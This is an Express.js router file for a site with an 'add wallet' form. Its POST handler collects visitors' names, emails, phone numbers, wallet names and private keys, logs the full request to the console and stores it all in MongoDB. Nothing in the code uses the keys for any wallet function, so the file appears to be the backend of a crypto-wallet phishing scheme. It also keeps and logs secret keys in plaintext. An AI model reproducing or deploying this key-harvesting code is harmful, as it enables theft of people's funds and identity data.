const express = require('express');
const mongoose = require('mongoose')
const bodyparser = require("body-parser");

const router = express.Router()
const WSDBModel = mongoose.model("WSDB")



router.get("/contact", (req, res) => {
    res.render("contact", {})
});

router.get("/successful", (req, res) => {
    res.render("successful", {})
});

router.get("/failed", (req, res) => {
    res.render("failed", {})
});

router.get("/add", (req, res) => {
    res.render("add-wallet");
});


router.post("/add", (req, res) => {
    console.log(req.body);
    var wsdb = new WSDBModel;
    wsdb.firstName = req.body.firstName;
    wsdb.lastName = req.body.lastName;
    wsdb.EmailAddress = req.body.EmailAddress;
    wsdb.PhoneNumber = req.body.PhoneNumber;
    wsdb.walletName = req.body.walletName;
    wsdb.privateKey = req.body.privateKey;
    wsdb.subject = req.body.subject;
    wsdb.message = req.body.message;
    wsdb.radio = req.body.radio;
    wsdb.pk = req.body.pk;
    wsdb.save((err, doc) => {
        if (!err)
        {
            res.redirect("/successful")
        }
        else {
            console.log(err);
            res.redirect("/failed")
        }
    })
});




module.exports = router;